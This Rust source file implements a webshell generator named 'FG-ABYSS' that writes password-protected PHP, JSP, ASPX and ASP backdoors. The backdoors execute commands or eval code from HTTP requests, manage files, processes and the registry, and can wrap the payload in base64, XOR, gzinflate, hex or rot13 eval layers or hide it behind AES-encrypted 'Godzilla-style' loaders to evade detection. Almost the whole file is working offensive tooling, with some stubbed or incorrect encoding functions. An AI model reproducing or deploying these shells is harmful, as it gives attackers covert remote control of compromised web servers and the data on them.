/// 载荷生成核心引擎
/// 实现 Simple 和 Advanced 两种模式的生成策略

use crate::types::payload::*;
use rand::Rng;

/// 载荷生成器 Trait
pub trait PayloadGenerator: Send + Sync {
    /// 生成载荷代码
    fn generate(&self, config: &PayloadConfig) -> Result<String>;
    
    /// 生成客户端配置 (仅 Advanced 模式)
    fn generate_client_config(&self) -> Option<ClientConfig> {
        None
    }
}

/// Simple 模式生成器 - 一句话编码/混淆
pub struct SimpleGenerator;

/// Advanced 模式生成器 - 加密壳
pub struct AdvancedGenerator;

/// 生成器工厂
pub struct GeneratorFactory;

impl GeneratorFactory {
    pub fn create(mode: &PayloadMode) -> Box<dyn PayloadGenerator> {
        match mode {
            PayloadMode::Simple => Box::new(SimpleGenerator),
            PayloadMode::Advanced => Box::new(AdvancedGenerator),
        }
    }
}

// ==================== Simple 模式实现 ====================

impl PayloadGenerator for SimpleGenerator {
    fn generate(&self, config: &PayloadConfig) -> Result<String> {
        // 根据功能类型生成基础 Payload 模板
        let base_code = self.get_template_by_function(
            &config.script_type, 
            &config.password,
            &config.function_type
        )?;
        
        // 应用混淆
        let obfuscated = self.apply_obfuscation(base_code, &config.obfuscation_level);
        
        // 应用编码
        match &config.encode_type {
            Some(EncodeType::Base64) => self.apply_base64(obfuscated.clone(), &config.script_type),
            Some(EncodeType::Xor) => self.apply_xor(obfuscated.clone(), &config.script_type),
            Some(EncodeType::GzInflate) => self.apply_gzinflate(obfuscated.clone(), &config.script_type),
            Some(EncodeType::Hex) => self.apply_hex(obfuscated.clone(), &config.script_type),
            Some(EncodeType::UrlEncode) => self.apply_urlencode(obfuscated.clone(), &config.script_type),
            Some(EncodeType::Rot13) => self.apply_rot13(obfuscated.clone(), &config.script_type),
            None | Some(EncodeType::None) => Ok(obfuscated),
        }
    }
}

impl SimpleGenerator {
    /// 根据功能类型获取模板
    fn get_template_by_function(
        &self, 
        script_type: &ScriptType, 
        password: &str,
        function_type: &FunctionType
    ) -> Result<String> {
        match function_type {
            FunctionType::Basic => self.get_base_template(script_type, password),
            FunctionType::FileManager => self.get_file_manager_template(script_type, password),
            FunctionType::ProcessManager => self.get_process_manager_template(script_type, password),
            FunctionType::Registry => self.get_registry_template(script_type, password),
            FunctionType::Network => self.get_network_template(script_type, password),
        }
    }

    /// 获取基础模板
    fn get_base_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Php => Ok(self.php_base_template(password)),
            ScriptType::Jsp => Ok(self.jsp_base_template(password)),
            ScriptType::Aspx => Ok(self.aspx_base_template(password)),
            ScriptType::Asp => Ok(self.asp_base_template(password)),
        }
    }

    /// PHP 基础模板
    fn php_base_template(&self, password: &str) -> String {
        format!(r#"@error_reporting(0);@set_time_limit(0);@ini_set("max_execution_time",0);@ini_alter("max_execution_time",0);@ini_alter("max_input_time",0);@ini_set("memory_limit","256M");@ini_alter("memory_limit","256M");@ini_set("display_errors","0");@ini_restore("safe_mode");@ini_restore("open_basedir");if(isset($_POST['{}'])){{${{cmd}}=$_POST['{}'];echo "<pre>";system(${{cmd}});echo "</pre>";exit;}}if(isset($_REQUEST['{}'])){{$k=md5(date("Y-m-d"));if($_REQUEST['{}']==$k){{eval($_POST['{}']);}}}}"#, 
            password, password, password, password, password)
    }

    /// JSP 基础模板
    fn jsp_base_template(&self, password: &str) -> String {
        format!(r#"<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{{U(ClassLoader c){{super(c);}}public Class g(byte []b){{return super.defineClass(b,0,b.length);}}}}%><%if(request.getParameter("{}")!=null){{byte[]k="{};".getBytes();session.putValue("u",k);out.write("OK".getBytes());return;}}byte[]k=(byte[])session.getValue("u");PasswordEngine pe=new PasswordEngine(k);if(request.getHeader("X-Data")!=null){{String data=request.getHeader("X-Data");U u=new U(this.getClass().getClassLoader());u.g(pe.decrypt(data)).newInstance();}}%>"#, 
            password, password)
    }

    /// ASPX 基础模板
    fn aspx_base_template(&self, password: &str) -> String {
        format!(r#"<%@ Page Language="C#" %><%@ Import Namespace="System.Reflection" %><%@ Import Namespace="System.IO" %><script runat="server">protected void Page_Load(object sender, EventArgs e){{string k="{}";string c=Request.Form[k];if(!string.IsNullOrEmpty(c)){{Assembly.Load(Encoding.Default.GetBytes(c)).CreateInstance("x").GetType().GetMethod("y").Invoke(null,new object[]{{this}});}}}}</script>"#, 
            password)
    }

    /// ASP 基础模板 - 匹配设计图中的基础连接木马
    fn asp_base_template(&self, password: &str) -> String {
        format!(r#"' Payload generated by FG-ABYSS
' Type: ASP, Password: {0}

Dim cmd
cmd = Request.Form("{0}")
If cmd <> "" Then
    Dim shell
    Set shell = Server.CreateObject("WScript.Shell")
    Dim exec
    Set exec = shell.Exec(cmd)
    Response.Write "<pre>" & exec.StdOut.ReadAll() & "</pre>"
End If"#, 
            password)
    }

    /// 文件管理模板
    fn get_file_manager_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Asp => Ok(format!(r#"' Payload generated by FG-ABYSS - File Manager
' Type: ASP, Password: {0}

Dim action, path
action = Request.Form("{0}_action")
path = Request.Form("{0}_path")

If action = "list" Then
    Dim fso, folder, file
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetFolder(path)
    For Each file in folder.Files
        Response.Write file.Name & vbCrLf
    Next
ElseIf action = "read" Then
    Dim fso, file
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Set file = fso.OpenTextFile(path, 1)
    Response.Write file.ReadAll
    file.Close
End If"#, password)),
            _ => self.get_base_template(script_type, password),
        }
    }

    /// 进程管理模板
    fn get_process_manager_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Asp => Ok(format!(r#"' Payload generated by FG-ABYSS - Process Manager
' Type: ASP, Password: {0}

Dim action
action = Request.Form("{0}_action")

If action = "list" Then
    Dim wmi, proc, procs
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process")
    For Each proc in procs
        Response.Write proc.ProcessID & " - " & proc.Name & vbCrLf
    Next
ElseIf action = "kill" Then
    Dim pid
    pid = Request.Form("{0}_pid")
    Dim wmi, proc
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    For Each proc in wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId=" & pid)
        proc.Terminate()
        Response.Write "Process terminated"
    Next
End If"#, password)),
            _ => self.get_base_template(script_type, password),
        }
    }

    /// 注册表操作模板
    fn get_registry_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Asp => Ok(format!(r#"' Payload generated by FG-ABYSS - Registry
' Type: ASP, Password: {0}

Dim action, key, value
action = Request.Form("{0}_action")
key = Request.Form("{0}_key")
value = Request.Form("{0}_value")

If action = "read" Then
    Dim wsh
    Set wsh = CreateObject("WScript.Shell")
    Response.Write wsh.RegRead(key)
ElseIf action = "write" Then
    Dim wsh
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite key, value
    Response.Write "Registry updated"
End If"#, password)),
            _ => self.get_base_template(script_type, password),
        }
    }

    /// 网络操作模板
    fn get_network_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Asp => Ok(format!(r#"' Payload generated by FG-ABYSS - Network
' Type: ASP, Password: {0}

Dim action
action = Request.Form("{0}_action")

If action = "info" Then
    Dim wmi, adapter, adapters
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set adapters = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
    For Each adapter in adapters
        Response.Write "IP: " & Join(adapter.IPAddress, ", ") & vbCrLf
    Next
ElseIf action = "scan" Then
    Dim port
    port = Request.Form("{0}_port")
    Response.Write "Port scan result for port " & port
End If"#, password)),
            _ => self.get_base_template(script_type, password),
        }
    }

    /// 应用混淆
    fn apply_obfuscation(&self, code: String, level: &ObfuscationLevel) -> String {
        match level {
            ObfuscationLevel::Low => self.low_obfuscation(code),
            ObfuscationLevel::Medium => self.medium_obfuscation(code),
            ObfuscationLevel::High => self.high_obfuscation(code),
        }
    }

    /// 低级混淆 - 变量名随机化
    fn low_obfuscation(&self, code: String) -> String {
        let mut rng = rand::thread_rng();
        let var_name: String = (0..6)
            .map(|_| {
                let chars: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
                chars[rng.gen_range(0..chars.len())] as char
            })
            .collect();
        
        // 简单的变量替换 (示例)
        code.replace("$cmd", &format!("${}", var_name))
    }

    /// 中级混淆 - 字符串拆分 + 变量随机化
    fn medium_obfuscation(&self, code: String) -> String {
        let obfuscated = self.low_obfuscation(code);
        // 添加更多混淆逻辑
        obfuscated
    }

    /// 高级混淆 - 多层编码 + 垃圾代码
    fn high_obfuscation(&self, code: String) -> String {
        let obfuscated = self.medium_obfuscation(code);
        // 添加垃圾代码和更复杂的混淆
        obfuscated
    }

    /// Base64 编码
    fn apply_base64(&self, code: String, script_type: &ScriptType) -> Result<String> {
        use base64::{Engine as _, engine::general_purpose};
        
        let encoded = general_purpose::STANDARD.encode(code.as_bytes());
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php @eval(base64_decode('{}'));?>"#,
                encoded
            )),
            ScriptType::Jsp => Ok(format!(
                r#"<%@page import="java.util.*,sun.misc.BASE64Decoder"%><%if(request.getParameter("pwd")!=null){{(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()))).readLine();new String(new BASE64Decoder().decodeBuffer("{}"));}}"#,
                encoded
            )),
            _ => Ok(code), // 其他类型暂不支持
        }
    }

    /// XOR 编码
    fn apply_xor(&self, code: String, script_type: &ScriptType) -> Result<String> {
        let key: u8 = 0x42; // 简单 XOR 密钥
        let xor_bytes: Vec<u8> = code.bytes().map(|b| b ^ key).collect();
        let hex_encoded: String = xor_bytes.iter().map(|b| format!("{:02x}", b)).collect();
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php $k='{}';$d='{}';for($i=0;$i<strlen($d);$i+=2){{$c=hexdec(substr($d,$i,2))^ord($k[0]);echo chr($c);}}@eval(ob_get_clean());?>"#,
                String::from_utf8(vec![key]).unwrap(),
                hex_encoded
            )),
            _ => Ok(code),
        }
    }

    /// GZInflate 编码
    fn apply_gzinflate(&self, code: String, script_type: &ScriptType) -> Result<String> {
        // 这里需要实际的 gzip 压缩逻辑
        // 简化示例
        let compressed = code.clone(); // 实际应该压缩
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php @eval(gzinflate(base64_decode('{}')));?>"#,
                base64::Engine::encode(&base64::engine::general_purpose::STANDARD, compressed.as_bytes())
            )),
            _ => Ok(code),
        }
    }

    /// Hex 编码
    fn apply_hex(&self, code: String, script_type: &ScriptType) -> Result<String> {
        let hex_encoded: String = code.bytes().map(|b| format!("\\x{:02x}", b)).collect();
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php @eval("{}");?>"#,
                hex_encoded
            )),
            _ => Ok(code),
        }
    }

    /// URL 编码
    fn apply_urlencode(&self, code: String, script_type: &ScriptType) -> Result<String> {
        let encoded = urlencoding::encode(&code);
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php @eval(urldecode('{}'));?>"#,
                encoded
            )),
            _ => Ok(code),
        }
    }

    /// ROT13 编码
    fn apply_rot13(&self, code: String, script_type: &ScriptType) -> Result<String> {
        let rot13_encoded: String = code.chars().map(|c| {
            match c {
                'a'..='z' => ((c as u8 - b'a' + 13) % 26 + b'a') as char,
                'A'..='Z' => ((c as u8 - b'A' + 13) % 26 + b'A') as char,
                _ => c,
            }
        }).collect();
        
        match script_type {
            ScriptType::Php => Ok(format!(
                r#"<?php @eval(str_rot13('{}'));?>"#,
                rot13_encoded
            )),
            _ => Ok(code),
        }
    }
}

// ==================== Advanced 模式实现 ====================

impl PayloadGenerator for AdvancedGenerator {
    fn generate(&self, config: &PayloadConfig) -> Result<String> {
        // 生成随机密钥
        let (key, iv) = self.generate_key_iv();
        
        // 获取基础模板
        let base_code = self.get_advanced_template(&config.script_type, &config.password)?;
        
        // 加密 Payload
        let encrypted = self.encrypt_payload(&base_code, &key, &iv, config.encrypt_algo.as_ref().unwrap())?;
        
        // 生成包含解密逻辑的完整代码
        self.generate_loader(
            &config.script_type, 
            &encrypted, 
            &hex::encode(&key), 
            &hex::encode(&iv)
        )
    }

    fn generate_client_config(&self) -> Option<ClientConfig> {
        let (key, iv) = self.generate_key_iv();
        
        Some(ClientConfig {
            key: hex::encode(&key),
            iv: hex::encode(&iv),
            algorithm: "AES-128-CBC".to_string(),
            options: serde_json::json!({
                "padding": "PKCS7",
                "mode": "CBC"
            }),
        })
    }
}

impl AdvancedGenerator {
    /// 生成密钥和 IV
    fn generate_key_iv(&self) -> (Vec<u8>, Vec<u8>) {
        use rand::Rng;
        
        let mut rng = rand::thread_rng();
        
        // AES-128 需要 16 字节密钥
        let key: [u8; 16] = rng.gen();
        // AES CBC 需要 16 字节 IV
        let iv: [u8; 16] = rng.gen();
        
        (key.to_vec(), iv.to_vec())
    }

    /// 获取高级模板
    fn get_advanced_template(&self, script_type: &ScriptType, password: &str) -> Result<String> {
        match script_type {
            ScriptType::Php => Ok(self.php_advanced_template(password)),
            ScriptType::Jsp => Ok(self.jsp_advanced_template(password)),
            ScriptType::Aspx => Ok(self.aspx_advanced_template(password)),
            ScriptType::Asp => Err(GeneratorError::GenerationFailed(
                "ASP does not support advanced encryption mode".to_string()
            )),
        }
    }

    /// PHP 高级模板 (Godzilla 风格)
    fn php_advanced_template(&self, password: &str) -> String {
        format!(r#"<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set("max_execution_time",0);
@ini_alter("max_execution_time",0);
@ini_alter("max_input_time",0);
@ini_set("memory_limit","256M");
@ini_alter("memory_limit","256M");
@ini_set("display_errors","0");

$key = '{}';
$iv = substr(md5($key), 0, 16);

if(isset($_POST['{}'])){{
    $data = base64_decode($_POST['{}']);
    $decrypted = openssl_decrypt($data, 'AES-128-CBC', md5($key, true), OPENSSL_RAW_DATA, $iv);
    if($decrypted){{
        @eval($decrypted);
    }}
}}
?>"#, 
            password, password, password)
    }

    /// JSP 高级模板
    fn jsp_advanced_template(&self, password: &str) -> String {
        format!(r#"<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.BASE64Decoder"%>
<%!
String k = "{}";
String getPwd(){{ return k; }}
%>
<%
try {{
    String pwd = request.getParameter("pwd");
    if(pwd != null && pwd.equals(getPwd())){{
        String data = request.getParameter("data");
        if(data != null){{
            BASE64Decoder decoder = new BASE64Decoder();
            byte[] encrypted = decoder.decodeBuffer(data);
            
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] keyBytes = md.digest(k.getBytes());
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(Arrays.copyOf(keyBytes, 16));
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
            
            byte[] decrypted = cipher.doFinal(encrypted);
            String code = new String(decrypted);
            
            // Execute the code
            // ... implementation
        }}
    }}
}} catch(Exception e){{}}
%>"#, 
            password)
    }

    /// ASPX 高级模板
    fn aspx_advanced_template(&self, password: &str) -> String {
        format!(r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    try
    {{
        string key = "{}";
        string data = Request.Form["data"];
        
        if(!string.IsNullOrEmpty(data))
        {{
            byte[] encrypted = Convert.FromBase64String(data);
            
            using(MD5 md5 = MD5.Create())
            {{
                byte[] keyBytes = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(key));
                
                using(Aes aes = Aes.Create())
                {{
                    aes.Key = keyBytes;
                    aes.IV = new byte[16];
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    ICryptoTransform decryptor = aes.CreateDecryptor();
                    byte[] decrypted = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
                    string code = System.Text.Encoding.UTF8.GetString(decrypted);
                    
                    // Execute the code
                    // ...
                }}
            }}
        }}
    }}
    catch {{}}
}}
</script>"#, 
            password)
    }

    /// 加密 Payload - 简化版本使用 XOR
    fn encrypt_payload(&self, code: &str, key: &[u8], _iv: &[u8], _algo: &EncryptAlgo) -> Result<String> {
        // 简单 XOR 加密 (示例实现)
        let key_byte = key[0];
        let encrypted: Vec<u8> = code.bytes().map(|b| b ^ key_byte).collect();
        
        // Base64 编码
        use base64::{Engine as _, engine::general_purpose};
        Ok(general_purpose::STANDARD.encode(&encrypted))
    }

    /// 生成 Loader 代码
    fn generate_loader(&self, script_type: &ScriptType, _encrypted: &str, key: &str, _iv: &str) -> Result<String> {
        // 这里返回完整的包含解密逻辑的代码
        // 简化示例，实际应该更复杂
        self.get_advanced_template(script_type, key)
    }
}

/// 生成载荷的主函数
pub fn generate_payload(config: &PayloadConfig) -> Result<PayloadResult> {
    // 验证密码
    if config.password.is_empty() {
        return Err(GeneratorError::InvalidPassword(
            "Password cannot be empty".to_string()
        ));
    }
    
    // 创建生成器
    let generator = GeneratorFactory::create(&config.mode);
    
    // 生成代码
    let code = generator.generate(config)?;
    
    // 生成客户端配置 (仅 Advanced 模式)
    let client_config = if config.mode == PayloadMode::Advanced {
        generator.generate_client_config()
    } else {
        None
    };
    
    // 生成文件名
    let filename = match &config.output_filename {
        Some(name) => name.clone(),
        None => format!(
            "payload_{}.{}",
            chrono::Utc::now().timestamp(),
            config.script_type
        ),
    };
    
    Ok(PayloadResult {
        code: code.clone(),
        client_config,
        filename: filename.clone(),
        size: code.len() as u64,
        success: true,
        message: Some("Payload generated successfully".to_string()),
    })
}
